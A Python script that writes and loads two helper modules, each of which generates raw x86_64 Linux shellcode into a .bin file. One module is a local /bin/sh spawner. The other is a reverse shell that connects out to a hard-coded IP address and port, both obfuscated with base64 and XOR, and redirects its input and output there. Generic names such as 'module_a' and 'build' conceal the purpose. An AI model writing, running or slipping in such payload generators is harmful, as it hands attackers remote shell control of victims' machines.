import os
import sys
import importlib.util

MOD_A = "module_a.py"
MOD_B = "module_b.py"
OUT_A = "out_a.bin"
OUT_B = "out_b.bin"

SRC_A = r'''import os
import base64

NAME = "module_a"
ARCH = "x86_64"
DATA = None
ARG = "L2Jpbi9zaAA="

def _d(s):
    return base64.b64decode(s)

def build():
    global DATA
    a = _d(ARG)
    c = b""
    c += b"\x48\x31\xf6"
    c += b"\x56"
    c += b"\x48\xbf" + a
    c += b"\x57"
    c += b"\x48\x89\xe7"
    c += b"\xb0\x3b"
    c += b"\x0f\x05"
    DATA = c
    return c

def save(path):
    if DATA is None:
        build()
    with open(path, "wb") as f:
        f.write(DATA)
    return os.path.getsize(path)

def entry(path):
    return save(path)
'''

SRC_B = r'''import os
import base64

NAME = "module_b"
H_B64 = "MjIzLjIyNi4xMzcuMTgw"
P_XOR = 4309
DATA = None

def _dec_host(s):
    return base64.b64decode(s).decode()

def _dec_port(n, k=157):
    return n ^ k

def build():
    global DATA
    host = _dec_host(H_B64)
    port = _dec_port(P_XOR)
    ip = [int(x) for x in host.split(".")]
    lo = port & 0xff
    hi = (port >> 8) & 0xff
    c = b""
    c += b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2"
    c += b"\xb0\x29\x40\xb7\x02\x40\xb6\x01\x0f\x05"
    c += b"\x48\x89\xc7"
    c += b"\x48\x31\xc0\x50\x50\x50\x50"
    c += b"\x48\x89\xe6"
    c += b"\x66\xc7\x06\x02\x00"
    c += b"\x66\xc7\x46\x02" + bytes([hi, lo])
    c += b"\xc6\x46\x04" + bytes([ip[0]])
    c += b"\xc6\x46\x05" + bytes([ip[1]])
    c += b"\xc6\x46\x06" + bytes([ip[2]])
    c += b"\xc6\x46\x07" + bytes([ip[3]])
    c += b"\xb0\x2a\x6a\x10\x5a\x0f\x05"
    c += b"\x48\x89\xc7"
    for fd in (0, 1, 2):
        c += b"\x48\x31\xc0\x40\xb7" + bytes([fd]) + b"\xb0\x21\x0f\x05"
    c += b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    c += b"\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
    DATA = c
    return c

def save(path):
    if DATA is None:
        build()
    with open(path, "wb") as f:
        f.write(DATA)
    return os.path.getsize(path)

def entry(path):
    return save(path)
'''

def _write(path, src):
    with open(path, "w") as f:
        f.write(src)
    return path

def _load(path):
    spec = importlib.util.spec_from_file_location(
        os.path.splitext(os.path.basename(path))[0], path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod

def main():
    _write(MOD_A, SRC_A)
    _write(MOD_B, SRC_B)
    ma = _load(MOD_A)
    mb = _load(MOD_B)
    sa = ma.entry(OUT_A)
    sb = mb.entry(OUT_B)
    print(f"[+] {ma.NAME}: {OUT_A} ({sa} bytes)")
    print(f"[+] {mb.NAME}: {OUT_B} ({sb} bytes)")

if __name__ == "__main__":
    main()